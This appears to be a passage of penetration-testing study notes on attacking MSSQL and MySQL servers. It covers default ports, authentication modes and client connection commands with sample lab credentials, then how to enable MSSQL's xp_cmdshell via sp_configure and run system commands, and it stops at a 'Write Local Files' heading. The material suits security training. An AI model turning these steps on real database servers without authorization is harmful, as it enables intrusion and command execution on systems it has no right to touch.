# Attacking SQL Databases

MSSQL uses ports `TCP/1433` and `UDP/1434` by default. And MySQL uses `TCP/3306`.
When MSSQL operates in a "hidden" mode, it uses the port `TCP/2433`
## Authentication Mechanisms

**MSSQL** supports 2 authentication modes.

| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                     |
**MySQL** also supports multiple authentication modes such as username and password, as well as, Windows Authentication (a plugin is required).  However, depending on which method is implemented, misconfigurations can occur.
## Protocol Specific Attacks

#### MySQL - Connecting to the SQL Server

```sh
mysql -u julio -pPassword123 -h 10.129.20.13
```
#### Sqlcmd - Connecting to the SQL Server

```sh
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

```ad-note
When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
```

Alternatively, we can use `mssqlclient` from `Impacket`

```sh
mssqlclient.py -p 1433 julio@10.129.203.7
```

```ad-note
When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.
```

```ad-note
When using **Windows Authentication** using `sqsh`, we need to specify the domain name or it will be considered SQL Authentication.

**Usage Example:**

`sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`
```

```ad-info
If we are using `sqlcmd` tool, we need to write the command `GO` after each query for execution
```

# Execute Commands

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allows us to execute system commands using SQL.

- `xp_cmdshell` is disabled by default, it can be enabled and disabled using  [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing `sp_configure`.
- `xp_cmdshell` operates synchronously, which means control doesn't return to us until the command  execution finishes 
## XP_CMDSHELL

```sh
xp_cmdshell 'whoami'
```

If `xp_cmdshell` is not enabled:

```sql
-- To allow advanced options to be changed. 
EXECUTE sp_configure 'show advanced options', 1 
GO 

-- To update the currently configured value for advanced options. 
RECONFIGURE 
GO 

-- To enable the feature. 
EXECUTE sp_configure 'xp_cmdshell', 1 
GO 

-- To update the currently configured value for this feature. 
RECONFIGURE GO
```

```ad-info
There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.

---

SQL supports **User Defined Functions** which allows us to execute C/C++ code within SQL. It is not common but we should be aware of it.
```

## Write Local Files

